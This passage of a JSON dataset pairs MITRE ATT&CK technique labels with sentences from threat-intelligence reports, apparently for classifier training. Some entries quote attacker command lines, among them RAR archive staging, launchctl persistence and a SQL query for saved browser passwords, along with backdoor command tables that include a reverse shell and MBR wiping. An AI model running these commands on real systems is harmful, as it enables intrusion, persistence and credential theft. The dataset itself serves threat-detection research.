c1e7368eda5aa7b09e6812569ebd4242 ec99e82ad8dbf1532b0a5b32c592efdf 391b9434379308e242749761f9edda8e 6bf76626037d187f47a54e97c173bc66 895f7469e50e9bb83cbb36614782a33e 1feacbef9d6e9f763590370c53cd6a30 82234c358d921a97d3d3a9e27e1c9825 558d0a7232c75e29eaa4c1df8a55f56b e565255a113b1af8df5adec568a161f3 1821351d67a3dce1045be09e88461fe9 b1fe41542ff2fcb3aa05ff3c3c6d7d13 53c5520febbe89c25977d9f45137a114 4513e3e8b5506df268881b132ffdcde1 19ce80e963a5bcb4057ef4f1dd1d4a89 9b29903a67dfd6fec33f50e34874b68b b637f8b5f39170e7e5ada940141ddb58 c09683d23d8a900a848c04bab66310f1 6d4c2cd95a2b27777539beee307625a2 e32d5c22e90cf96296870798f9ef3d15 64c3ecfd104c0d5b478244fe670809cc b69f09eee3da15e1f8d8e8f76d3a892a 294f9e8686a6ab92fb654060c4412edf 6135bd02103fd3bab05c2d2edf87e80a b973daa1510b6d8e4adea3fb7af05870 8dce09a2b2b25fcf2400cffb044e56b8 6008f85d63f690bb1bfc678e4dc05f97 1bf8434e6f6e201f10849f1a4a9a12a4 6cac1a8ba79f327d0ad3f4cc5a839aa1 462860910526904ef8334ee17acbbbe5 eeec7c4a99fdfb0ef99be9007f069ba8 6bbc54fb91a1d1df51d2af379c3b1102 8b152fc5885cb4629f802543993f32a1 6d1187f554040a072982ab4e6b329d14 3bfe642e752263a1e2fe22cbb243de57 c629933d129c5290403e9fce8d713797 1c62b3d0eb64b1511e0151aa6edce484 811fcbadd31bccf4268653f9668c1540 0a89949a3a933f944d0ce4c0a0c57735 a0f594802fbeb5851ba40095f7d3dbd1 bf6ce6d90535022fb6c95ac9dafcb5a5 df84ff928709401c8ad44f322ec91392 fda6f18cf72e479570e8205b0103a0d3 39835e790f8d9421d0a6279398bb76dc fe6295c647e40f8481a16a14c1dfb222 592c5fbf99565374e9c20cade9ac38aa ad8dc222a258d11de8798702e52366aa bc21639bf4d12e9b01c0d762a3ffb15e 3122353bdd756626f2dc95ed3254f8bf e02d19f07f61d73fb6dd5f7d06e9f8d2 d2c7bf274edb2045bc5662e559a33942 ac1a265be63be7122b94c63aabcc9a66 e06c27e3a436537a9028fdafc426f58e 6cf2302e129911079a316cf73a4d010f 38b6ad30940ddfe684dad7a10aea1d82 f190cda937984779b87169f35e459c3a 698a41c92226f8e444f9ca7647c8068c bc95b3d795a0c28ea4f57eafcab8b5bb 82127dc2513694a151cbe1a296258850 d387a5e232ed08966381eb2515caa8e1 f4b9eb3ddcab6fd5d88d188bc682d21d 8e42fd3f9d5aac43d69ca740feb38f97 a43e8ddecfa8f3c603162a30406d5365 ea7dd992062d2f22166c1fca1a4981a1 7bf6dcf413fe71af2d102934686a816b cf064356b31f765e87c6109a63bdbf43 4a46e2dc16ceaba768b5ad3cdcb7e097 2134721de03a70c13f2b10cfe6018f36 7add5fd0d84713f609679840460c0464 cc9402e5ddc34b5f5302179c48429a56 9803e49d9e1c121346d5b22f3945bda8 c5f5837bdf486e5cc2621cc985e65019 2b72fda4b499903253281ebbca961775 7031f6097df04f003457c9c7ecbcda1c 6a6c2691fef091c1fc2e1c25d7c3c44c 9bd3fa59f30df5d54a2df385eba710a5 5100eb13cac2fc3dec2d00c5d1d3921c 0a2c2f5cf97c65f6473bdfc90113d81e 30b74abc22a5b75d356e3a57e2c84180 a0424e8436cbc44107119f62c8e7491b c1ba892d254edd8a580a16aea6f197e9 e70976785efcfaeed20aefab5c2eda60 397b5d66bac2eb5e950d2a4f9a5e5f2c 4e9bde9b6abf7992f92598be4b6d1781 54d266dee2139dd82b826a9988f35426 5b4faa2846e91e811829a594fecfe493 907448af4388072cdc01e69b7b97b174 ccad214045af69d06768499a0bd3d556 1395dfda817818c450327ab331d51c1b 715e9e60be5a9b32075189cb04a0247e 3835c8168d66104eed16c2cd99952045 f32c29a620d72ec0a435982d7a69f683 95e9162456d933fff9560bee3c270c4e da01ef50673f419cf06b106546d06b50 2dd4c551eacce0aaffedf4e00e0d03de 34f80f228f8509a67970f6062075e211 81ca7526881a0a41b6721048d2f20874 d642c73d0577dd087a02069d46f68dac BE3 MD5s: f0ebb6105c0981fdd15888122355398c 7cb6363699c5fd683187e24b35dd303e 4d5c00bddc8ea6bfa9604b078d686d45 f37b67705d238a7c2dfcdd7ae3c6dfaa 46649163c659cba8a7d0d4075329efa3 628ef31852e91895d601290ce44650b1 723eb7a18f4699c892bc21bba27a6a1a 8b9f4eade3a0a650af628b1b26205ba3 f6c47fcc66ed7c3022605748cb5d66c6 6c1996c00448ec3a809b86357355d8f9 faab06832712f6d877baacfe1f96fe15 2c72ef155c77b306184fa940a2de3844 2e62e8949d123722ec9998d245bc1966 b0dc4c3402e7999d733fa2b668371ade 93fa40bd637868a271002a17e6dbd93b f98abf80598fd89dada12c6db48e3051 8a7c30a7a105bd62ee71214d268865e3 2f6582797bbc34e4df47ac25e363571d 81d127dd7957e172feb88843fe2f8dc1 3e25544414030c961c196cea36ed899d Previous and Parallel Research Botnet History Illustrated by BlackEnergy 2, PH Days, Kaspersky Lab \u2013 Maria Garnaeva and Sergey Lozhkin, May 2014 BlackEnergy and Quedagh (pdf), F-Secure, September 2014 Sandworm, iSIGHT Partners, October 2014 Alert (ICS-ALERT-14-281-01A)\u00a0Ongoing Sophisticated Malware Campaign Compromising ICS (Update A), ICS-CERT, October 2014"
    ]
  },
  "standard application layer protocol connection proxy exfiltration over command and control channel data encoding data encrypted-multi": {
    "technique_names": [
      "application layer protocol",
      "proxy",
      "exfiltration over c2 channel",
      "data encoding",
      "data encrypted for impact"
    ],
    "sentances": [
      "Thread Name   Description    Key logger  Logs key strokes for configured processes and sends them to the command and control (C2) server    Form grabber  Monitors HTTP traffic for form data and sends it to the C2 server    POS monitor  Monitors for changes to logs stored in C:\\NSB\\Coalition\\Logs and nsb.pos.client.log and sends parsed data to the C2 server    PST monitor  Searches recursively for newly created Outlook personal storage table (PST) files within user directories and sends them to the C2 server    HTTP proxy monitor  Monitors HTTP traffic for requests sent to HTTP proxies, saves the proxy address and credentials for future use    Table 1: Monitoring threads Commands In addition to its file management capabilities, this data-stealing backdoor supports 34 commands that can be received from the C2 server"
    ]
  },
  "timestomp system network configuration discovery-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "system network configuration discovery"
    ],
    "sentances": [
      "Command Hash   Command Name   Description    0x0AA37987  loadconfig  Runs each command specified in the configuration file (see the Configuration section)"
    ]
  },
  "exfiltration over command and control channel remote file copy fallback channels-multi": {
    "technique_names": [
      "exfiltration over c2 channel",
      "ingress tool transfer",
      "fallback channels"
    ],
    "sentances": [
      "0x007CFABF  video  Desktop video recording    0x06E533C4  download  Downloads executable and injects into new process    0x00684509  ammyy  Ammyy Admin tool    0x07C6A8A5  update  Updates self    0x0B22A5A7  \u00a0  Add/Update klgconfig (analysis incomplete)    0x0B77F949  httpproxy  Starts HTTP proxy    0x07203363  killos  Renders computer unbootable by wiping the MBR    0x078B9664  reboot  Reboots the operating system    0x07BC54BC  tunnel  Creates a network tunnel    0x07B40571  adminka  Adds new C2 server or proxy address for pseudo-HTTP protocol    0x079C9CC2  server  Adds new C2 server for custom binary protocol    0x0007C9C2  user  Creates or deletes Windows user account    0x000078B0  rdp  Enables concurrent RDP (analysis incomplete)    0x079BAC85  secure  Adds Notification Package (analysis incomplete)    0x00006ABC  del  Deletes file or service    0x0A89AF94  startcmd  Adds command to the configuration file (see the Configuration section)    0x079C53BD  runmem  Downloads executable and injects directly into new process    0x0F4C3903  logonpasswords  Send Windows accounts details to the C2 server    0x0BC205E4  screenshot  Takes a screenshot of the desktop and sends it to the C2 server    0x007A2BC0  sleep  Backdoor sleeps until specified date    0x0006BC6C  dupl  Unknown    0x04ACAFC3  \u00a0  Upload files to the C2 server    0x00007D43  vnc  Runs VNC plugin    0x09C4D055  runfile  Runs specified executable file    0x02032914  killbot  Uninstalls backdoor    0x08069613  listprocess  Returns list of running processes to the C2 server    0x073BE023  plugins  Change C2 protocol used by plugins    0x0B0603B4  \u00a0  Download and execute shellcode from specified address    0x0B079F93  killprocess  Terminates the first process found specified by name    0x00006A34  cmd  Initiates a reverse shell to the C2 server    0x09C573C7  runplug  Plugin control    0x08CB69DE  autorun  Updates backdoor    Table 2: Supported Commands Configuration A configuration file resides in a file under the backdoor\u2019s installation directory with the .bin extension"
    ]
  },
  "obfuscated files or information data encoding-multi": {
    "technique_names": ["obfuscated files or information", "data encoding"],
    "sentances": [
      "The encrypted message is then Base64 encoded, replacing all the \u2018/\u2019 and \u2018+\u2019 characters with the \u2018.\u2019 and \u2018-\u2019 characters, respectively",
      "The SHA256 hash is then base64 encoded, which results in an encoded string of EfZrVfPSQwNiHl75VlsCpXbMWLxfh4nK6Ww9QABkuQ4=, of which the first 24 characters are used as the 3DES key",
      "A string with the 5-character length and encoded with BASE64 is added to the beginning of the buffer encoded using the BASE64 algorithm",
      "For instance, the following 15 bytes were used to generate an HTTP parameter during our analysis:    Random Value Constant Value agent_id   0F EE C8 83 56 0E 9F F0 EB 98 43 30 30 30 30    The resulting ciphertext is then encoded using XAgent\u2019s base64 encoding routine that starts by building the following encoding alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ As you can see, this is not the standard base64 alphabet, rather it is the \u201cURL and Filename safe\u201d Base 64 Alphabet from RFC 4648, as the \u201c+\u201d in the standard alphabet is replaced with \u201c-\u201d and the \u201c/\u201d replaced with \u201c_\u201d"
    ]
  },
  "standard application layer protocol connection proxy-multi": {
    "technique_names": ["application layer protocol", "proxy"],
    "sentances": [
      "Figure 5: Sample pseudo-HTTP beacon The pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command"
    ]
  },
  "proxy obfuscated files or information-multi": {
    "technique_names": ["obfuscated files or information", "proxy"],
    "sentances": ["All subsequent messages are encrypted with AES in CBC mode"]
  },
  "masquerading": [
    "What changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not",
    "This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat",
    "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta    nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35    rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0    Table 5",
    "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta   hb.exe 3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62 Hobocopy   nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35   rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0   tardigrade.exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392 Tardigrade application",
    "CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset",
    "In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\\windows\\temp\\svchost.exe a -m5 -v2000m -hp{password} -inul -r \"{destination_file.rar}\" \"{multiple user directories linked to the victim's projects}\" -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives",
    "SHA256  a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff   MD5 1ff40e79d673461cd33bd8b68f8bb5b8   Compiled 2017.08.06 11:32:36 (GMT), 2.22   Type I386 Windows Console EXE   Size 101 888    Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:    Parameter Description   -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration",
    "The file is named netwf.dat",
    "For example, APT32 installed one backdoor as a persistent service with a legitimate service name that had a Unicode no-break space character appended to it",
    "The account names visually look similar to legitimate government organization names or other trusted third-party entities",
    "The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload",
    "Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension   3",
    "The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program",
    "Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity",
    "The \u201cVPN Client\u201d is a legitimate Juniper VPN software bundled with Helminth, \u00a0a malware in use by the OilRig threat agnet: JuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed",
    "For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to \u201c%TEMP%\\flash_update.exe\u201d that was a legitimate Flash Player installer",
    "Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities:  Drops a copy of itself in %AppData%\\svchost.exe\\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11)",
    "Firstly, the reason this has been named MirageFox instead of just Mirage, is because in the Export directory for the modules, the name field is filled with a string MirageFox_Server.dat",
    "SHA256 Filename PowerShell Filename Variant   5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe   d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NET    Table 1",
    "The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe",
    "After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name",
    "The Downloader After the exploit or script executes, the system downloads install.exe, which has the following metadata: MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 5a0c4e1925c76a959ab0588f683ab437 Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 46592 bytes Compile Time\u00a0\u00a0\u00a0 2014-11-19 08:55:10Z Import Hash\u00a0 \u00a0\u00a0\u00a06b8611f8148a6b51e37fd68e75b6a81c The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path \u201cC:\\Users\\Public\u201d, which fails on Windows XP because that path is not present by default",
    "One example of these samples is given below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb The file is a self-extracting RAR, which is a common delivery mechanism for PlugX particularly when the eventual payload will be sideloaded by a legitimate executable",
    "Filename qrat.exe   File Size 1093120 bytes   MD5 c05e5131b196f43e1d02ca5ccc48ec0e   SHA1 f28c592833f234c619917b5c7d8974840a810247   Notes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll",
    "Filename  Part-I.doc    File Size  11349102 bytes    MD5  92942c54224cd462dd201ae11a560bb8    SHA1  85a21624df2211af3daf05c86a3fbea8271059d3    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe",
    "Filename  Part-II.doc    File Size  10156713 bytes    MD5  e32668e569362c96cc56db368b7e821e    SHA1  dadc493abbe3e21610539e1d5a42f523626a6132    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-audio.exe",
    "Filename  vsrss.exe    File Size  446976 bytes    MD5  5c3456d5932544b779fe814133344fdb    SHA1  7ab750afb25457a81c27a98dc6dfd51c27e61b0e    Notes Delphi RAT file that beacons to ebeijingcn.live",
    "When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\\Microsoft\\DeviceSync\\VMwareCplLauncher.exe %PROGRAMDATA%\\Microsoft\\DeviceSync\\vmtools.dll %PROGRAMDATA%\\Microsoft\\DeviceSync\\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload",
    "The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool",
    "These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders",
    "In one instance we observed, one of the initial malware delivered to the victim, RATANKBA (TROJ_RATANKBA.A), connects to a legitimate but compromised website (eye-watch[.]in:443, a mobile application-selling site) from which a hack tool (nbt_scan.exe) is also downloaded",
    "One archive sample analyzed by CTU researchers contained a legitimate PDF file, a benign image of interest to targets (see Figure 8), and an HttpBrowser installer disguised as an image file",
    "The legitimate owaauth.dll file resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\ while CTU researchers have observed the backdoor using the same filename in the %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\ directory",
    "It was pretending to be an Adobe flash player update installer on a compromised website to lure users to click for the execution",
    "",
    "Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.",
    "likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor",
    "It named Meterpreter as a WAV file type, probably in the hope that this would not raise suspicions",
    "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)"
  ],
  "connection proxy system network connections discovery-multi": {
    "technique_names": ["proxy", "system network connections discovery"],
    "sentances": [
      "FIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated portions of the victim environment"
    ]
  },
  "remote services: smb/windows admin shares": [
    "Additionally, some of this early activity shares a similarity with current FIN7 operations \u2013 the use of Power Admin PAExec for lateral movement",
    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)"
  ],
  "system owner/user discovery account discovery-multi": {
    "technique_names": ["system owner/user discovery", "account discovery"],
    "sentances": [
      "This account was suspended in short order, but immediately after the suspension, an alternate account with the username @dookhtegan1 with the same stylized profile image appeared and is still currently active",
      "An example of this buffer at runtime is below: \u00a0 00000000: 43 3A 5C 55 73 65 72 73\u00a0 5C 4D 53 5C 44 65 73 6B\u00a0 C:\\Users\\MS\\Desk 00000010: 74 6F 70 5C 52 53 2D 41\u00a0 54 54 20 56 33 5C 50 6C\u00a0 top\\RS-ATT V3\\Pl 00000020: 75 67 69 6E 42 69 6E 00\u00a0 00 00 00 00 00 00 00 00\u00a0 uginBin\u2026\u2026\u2026uginBin\u2026\u2026\u2026 [TRUNCATED] 00000100: 00 00 00 00 43 3A 5C 55\u00a0 73 65 72 73 5C 4D 53 5C\u00a0 \u2026.C:\\Users\\MS\\ 00000110: 44 65 73 6B 74 6F 70 5C\u00a0 52 53 2D 41 54 54 20 56\u00a0 Desktop\\RS-ATT V 00000120: 33 5C 5A 43 6F 6E 66 69\u00a0 67 00 00 00 00 00 00 00\u00a0 3\\ZConfig\u2026\u2026.ZConfig\u2026\u2026"
    ]
  },
  "credential dumping exfiltration over command and control channel-multi": {
    "technique_names": [
      "os credential dumping",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "Tweets by second account @dookhtegan1 providing a Telegram channel with the leaked files Data Dump Contents The contents of the data dump includes various types of datasets that appear to be results from reconnaissance activity, initial compromises, and tools the OilRig operators use against target organizations"
    ]
  },
  "create or modify system process: launch agent": [
    "The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel",
    "Using a custom User Agent string or the system's User Agent string derived from urlmon.dll   7",
    "Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login",
    "Persistence Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots",
    "From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation",
    "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) "
  ],
  "launch agent remote file copy-multi": {
    "technique_names": [
      "create or modify system process: launch agent",
      "ingress tool transfer"
    ],
    "sentances": [
      "The agent control panel has three tabs that have interfaces that allow the actor to issue commands, as well as upload and download files to and from the agent"
    ]
  },
  "system owner/user discovery": [
    "Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami",
    "The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent",
    "The webshell will save the archives locally to the server in the C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network",
    "There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field",
    "This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems",
    "The same code snippets are combined into a second stage JavaScript in \u201cC:\\Users\\<User Name>\\\u201d",
    "The username appears to be attacker specified and has occurred in 2017 Bankshot samples",
    "This links the previous samples with this unique username",
    "If the Trojan does not have root privileges to enable its automatic launch, it creates the \u201c~/.config/autostart/dbus-inotifier.desktop\u201d file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= \u201c/home/user/\u201d stands here for the environment variable HOME",
    "Note that the username could be a small joke on the attackers\u2019 part regarding the attribution to FIN7",
    "The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list \u201c.plist\u201d for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)",
    "Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables",
    "The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg",
    "code(2343)\", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1",
    "File is dropped to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0\\microsoft_network.exe",
    "File starts as mico-audio.exe and installs to C:\\Users\\%USERNAME%\\AppData\\Roaming\\google-chrome\\crome.exe",
    "These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions",
    "For example, in the previous variant of BADNEWS, the victim\u2019s unique identifier was stored under a variable named \u2018uid\u2019, the username was stored in a variable named \u2018u\u2019, etc",
    "Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign",
    "(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)",
    "PDB strings containing the 'SyberSpace' username",
    "The SP variable is a string containing the victim's username",
    "When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell",
    "It also attempts to issue the following SQL query on the \u201csignons.sqlite\u201d file: \u201cSELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?\u201d   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password",
    "The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.",
    "Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.",
    "",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "collect usernames",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    "whoami ",
    " query user",
    " query user",
    " query user",
    " query user",
